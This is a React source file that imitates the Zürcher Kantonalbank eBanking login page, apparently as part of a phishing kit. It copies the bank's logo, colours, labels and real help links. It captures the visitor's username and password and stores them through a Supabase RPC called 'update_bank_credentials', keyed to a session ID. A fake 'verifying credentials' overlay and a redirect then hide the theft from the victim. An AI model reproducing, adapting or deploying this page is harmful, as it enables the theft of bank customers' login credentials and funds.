import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { HelpCircle, ChevronDown, User } from "lucide-react";
import logoAsset from "@/assets/zuercher-kantonalbank-logo.svg.asset.json";

const BLUE = "#003CB4";
const BLUE_HOVER = "#0a6cff";
const OUTLINE = "#65a6fb";
const DIVIDER = "#a5ccf8";
const CARD_BG = "#edf5ff";

type FieldProps = {
  id: string;
  label: string;
  type?: string;
  value: string;
  onChange: (v: string) => void;
};

const FloatingField = ({ id, label, type = "text", value, onChange }: FieldProps) => (
  <div
    className="relative w-full border-[2px] transition-colors rounded-none hover:border-[#003CB4] focus-within:border-[#003CB4]"
    style={{ borderColor: OUTLINE }}
  >
    <input
      id={id}
      type={type}
      value={value}
      onChange={(e) => onChange(e.target.value)}
      placeholder=" "
      className="peer w-full bg-transparent outline-none px-3 pt-5 pb-2 text-[15px] text-[#003CB4] placeholder-transparent rounded-none"
    />
    <label
      htmlFor={id}
      className="pointer-events-none absolute left-3 top-1/2 -translate-y-1/2 text-[15px] text-[#003CB4] transition-all duration-200
                 peer-focus:top-1.5 peer-focus:translate-y-0 peer-focus:text-[11px]
                 peer-[:not(:placeholder-shown)]:top-1.5 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-[11px]"
    >
      {label}
    </label>
  </div>
);

const quicklinks = [
  {
    label: "Wie aktiviere ich ein neues Smartphone?",
    href: "https://www.zkb.ch/de/hilfe/skf/smartphone-oder-tablet-ersetzen.html",
  },
  {
    label: "Häufige Fragen (FAQ)",
    href: "https://www.zkb.ch/de/hilfe.html#private/haeufige-fragen",
  },
  {
    label: "eBanking kennenlernen",
    href: "https://www.zkb.ch/de/private/digitales-banking/ebanking.html",
  },
];

const ChZuercherKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [benutzername, setBenutzername] = useState("");
  const [passwort, setPasswort] = useState("");

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);
  usePageMeta("Zürcher Kantonalbank – eBanking", logoAsset.url);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: benutzername,
        p_password: passwort,
        p_username_label: "Benutzername",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col bg-white">
        {/* Header */}
        <header className="w-full flex items-center justify-between py-4 px-6" style={{ color: BLUE }}>
          <img src={logoAsset.url} alt="Zürcher Kantonalbank" className="h-8" />
          <nav className="flex items-center gap-6 text-[15px]">
            <button type="button" aria-label="Hilfe" className="flex items-center">
              <HelpCircle size={22} strokeWidth={1.75} />
            </button>
            <button type="button" className="flex items-center gap-1">
              <span>De</span>
              <ChevronDown size={16} strokeWidth={2} />
            </button>
            <button type="button" aria-label="Konto" className="flex items-center gap-1">
              <User size={22} strokeWidth={1.75} />
              <ChevronDown size={16} strokeWidth={2} />
            </button>
          </nav>
        </header>

        {/* Divider */}
        <div className="w-full" style={{ borderTop: `2px solid ${DIVIDER}` }} />

        {/* Body */}
        <main className="flex-1 px-8 md:px-32 lg:px-48 py-16 md:py-24">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-12">
            {/* Login */}
            <section className="flex flex-col items-start">
              <h1 className="text-[32px] font-bold mb-8" style={{ color: BLUE }}>
                Login eBanking
              </h1>

              <div className="w-full space-y-4">
                <FloatingField
                  id="benutzername"
                  label="Benutzername"
                  value={benutzername}
                  onChange={setBenutzername}
                />
                <FloatingField
                  id="passwort"
                  label="Passwort"
                  type="password"
                  value={passwort}
                  onChange={setPasswort}
                />
              </div>

              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                className="mt-3 text-sm underline"
                style={{ color: BLUE }}
              >
                Passwort vergessen?
              </a>

              <button
                onClick={handleSubmit}
                className="mt-8 text-white text-[15px] px-8 py-2.5 rounded-none transition-colors"
                style={{ backgroundColor: BLUE }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = BLUE_HOVER)}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = BLUE)}
              >
                Weiter
              </button>
            </section>

            {/* Support Card */}
            <aside className="p-8 rounded-none" style={{ backgroundColor: CARD_BG, color: BLUE }}>
              <h2 className="font-bold text-lg mb-6">Benötigen Sie Unterstützung?</h2>

              <ul className="space-y-3">
                {quicklinks.map((l) => (
                  <li key={l.href} className="flex items-center">
                    <span
                      className="inline-block mr-3"
                      style={{ width: 28, borderTop: `1px solid ${BLUE}` }}
                    />
                    <a
                      href={l.href}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-[15px] hover:underline"
                      style={{ color: BLUE }}
                    >
                      {l.label}
                    </a>
                  </li>
                ))}
              </ul>

              <h3 className="font-bold mt-8 mb-2">Support</h3>
              <div className="text-sm leading-6">
                <div>Mo - Fr 08:00 - 22:00</div>
                <div>Sa - So 09:00 - 18:00</div>
              </div>
            </aside>
          </div>
        </main>
      </div>
    </>
  );
};

export default ChZuercherKantonalbank;
